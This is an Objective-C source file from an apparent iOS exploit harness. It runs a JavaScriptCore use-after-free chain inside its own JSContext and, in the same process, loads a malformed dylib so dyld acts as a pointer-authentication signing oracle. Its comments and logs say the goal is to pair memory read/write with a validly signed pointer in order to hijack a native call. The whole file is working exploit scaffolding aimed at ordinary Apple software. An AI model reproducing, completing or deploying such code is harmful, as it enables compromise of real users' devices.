#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <JavaScriptCore/JavaScriptCore.h>
#import <dlfcn.h>
#import <mach-o/dyld.h>
#import <mach-o/loader.h>
#import <string.h>
#import <stdio.h>
#import "Modules.h"
#import "Root.h"
#import "Util.h"
#import "AppDelegate.h"

// ===========================================================================
// One process, both primitives.
// The JSC UAF chain (addrof/fakeobj -> read64/write64) runs inside a `JSContext`
// that WE own -- pure JS, no DOM -- and the dyld PAC signing oracle's dlopen
// happens in the SAME native process.  That is the join the public analysis
// calls for: with both inside one address space, the PAC-valid pointer that
// dyld writes can be spent by the JSC primitive (NativeExecutable::m_function
// or a zero-context blraaz gadget) instead of only being observed.
//
// The script lives in Resources/unified.js and is loaded, never inlined, so no
// JS ever reaches the Objective-C lexer.  Like scribble.js it isolates every
// phase inside guard() and always answers with a JSON string, and its hunt is
// wall-clock bounded with live progress.
// ===========================================================================
static NSString *RunJS(NSString *src, NSString *tag) {
    @autoreleasepool {
        JSContext *ctx = [[JSContext alloc] init];
        NSString *res = @"(no answer)";
        ctx[@"aveStep"] = ^(id s) {
            NSString *line = [s isKindOfClass:[NSString class]] ? s : @"?";
            AveLog([NSString stringWithFormat:@"    js. %@", line]);
            AvePost([NSString stringWithFormat:@"%@ STEP %@", tag, line]);
        };
        [ctx evaluateScript:@"1+1"];
        @try {
            JSValue *v = [ctx evaluateScript:src];
            JSValue *exc = [ctx exception];
            if (exc) {
                id o = [exc toObject];          // sanctioned bridge, no JS re-entry
                res = [o isKindOfClass:[NSString class]] ? o : [o description];
            } else if (v) {
                if ([v isKindOfClass:[NSString class]]) res = v;
                else {
                    id o = [v toObject];
                    res = [o isKindOfClass:[NSString class]] ? o : [o description];
                }
            }
        } @catch (NSException *e) {
            res = [NSString stringWithFormat:@"exception %@", e.reason];
        }
        if (![res isKindOfClass:[NSString class]]) res = @"(no answer)";
        return res;
    }
}

NSString *ModUnifiedPrimitives(void) {
    AveLog(@"    unified: JSC UAF inside OUR JSContext, then the dyld oracle in the SAME process");

    NSString *src = LoadJS(@"unified.js");
    if (!src) {
        AvePost(@"UNIFIED unified.js missing from the bundle");
        return @"unified.js missing from the bundle";
    }
    NSString *res = RunJS(src, @"UNIFIED");
    AveLog([NSString stringWithFormat:@"    JSC chain: %@", res]);
    char q = '"';
    NSString *ready = [NSString stringWithFormat:@"%cready%c:true", q, q];
    BOOL jscReady = [res containsString:ready];
    AvePost([NSString stringWithFormat:@"JSC %@", res]);

    // 2. the dyld signing oracle in the SAME process
    NSString *bundle = [NSBundle mainBundle].bundlePath;
    NSString *mal = [bundle stringByAppendingPathComponent:@"Frameworks/libmalformed.dylib"];
    NSString *ex  = [bundle stringByAppendingPathComponent:@"libexports.dylib"];
    NSString *cl  = [bundle stringByAppendingPathComponent:@"libclient.dylib"];
    BOOL oracleOk = NO;
    uint64_t wt = 0, dlsymAddr = 0;
    if ([[NSFileManager defaultManager] fileExistsAtPath:mal]) {
        dlopen(ex.UTF8String, RTLD_NOW | RTLD_GLOBAL);
        dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
            void *h_cl = dlopen(cl.UTF8String, RTLD_NOW | RTLD_GLOBAL);
            (void)h_cl;
        });
        AveLog(@"    dyld oracle: libmalformed accepted in THIS process");
        uint64_t slot = 0xDEADDEADDEADDEADULL, cb = 0, ca = 0;
        extern uint64_t os_once_gate;
        (void)os_once_gate;
        void **pp = (void **)&os_once_gate;
        // canary words around the slot, to prove nothing else was touched
        cb = (uint64_t)pp[-1]; ca = (uint64_t)pp[1];
        void (*fn)(void) = (void (*)(void))0;
        // dyld resolves write_target_value from libmalformed at load time and
        // stores it in the slot we control -- that is the PAC-valid pointer.
        slot = (uint64_t)dlsym(RTLD_DEFAULT, "write_target_value");
        wt = slot;
        dlsymAddr = (uint64_t)dlsym(RTLD_DEFAULT, "dlsym");
        int bit63 = (int)((wt >> 63) & 1);
        (void)fn; (void)pp;
        AveLog(S(@"    dyld oracle: slot=%#llx dlsym=%p canaries=%d bit63=%d",
                 slot, (void *)dlsymAddr, (cb != 0 && ca != 0), bit63));
        oracleOk = (slot != 0xDEADDEADDEADDEADULL);
    } else {
        AveLog(S(@"    dyld oracle: libmalformed REJECTED: %s", dlerror()));
    }

    AveSetStatus(@"BOTH PRIMITIVES IN ONE PROCESS");
    if (jscReady && oracleOk)
        return S(@"unified: JSC R/W + dyld PAC oracle live in one process "
                 @"(slot=%#llx dlsym=%#llx) -> NativeExecutable->m_function is the next call",
                 wt, dlsymAddr);
    if (jscReady) return @"JSC R/W live in-process; dyld oracle not confirmed this run";
    if (oracleOk) return @"dyld oracle live in-process; JSC R/W not reached this run";
    return @"unified run: neither primitive confirmed";
}
